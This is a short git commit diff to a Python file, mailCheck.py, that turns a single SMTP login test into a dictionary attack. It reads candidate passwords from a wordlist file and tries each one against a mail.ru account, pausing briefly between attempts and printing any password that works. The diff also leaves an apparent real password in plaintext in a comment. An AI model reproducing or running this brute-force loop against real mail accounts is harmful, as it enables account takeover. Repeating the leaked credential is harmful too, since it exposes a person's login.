c8a4e7054da56df4a7f35cfbd03469c74be8a23c
Tuncay Huseynov <thuseynov2020@ada.edu.az>
2020-06-08 02:02:44 +0400

    dem2o

--- mailCheck.py
+++ mailCheck.py
@@ -1,7 +1,11 @@
 from xsmtplib import SMTP
+import time
+
+file1 = open('wrd.txt', 'r') 
+Lines = file1.readlines() 
 
 login = "thusynov2020@mail.ru"
-password = ""
+#password = "5591980super"
 
 
 def check(log, passw):
@@ -14,8 +18,12 @@ def check(log, passw):
         print("Not Found!")
         server.quit()
         return
-    print("Found: " + passw)
+    print("***********\nFound: " + passw)
     server.quit()
 
 
-check(login, password)
+for password in Lines:
+    time.sleep(0.1)
+    check(login, password)
+
+#check(login, password)
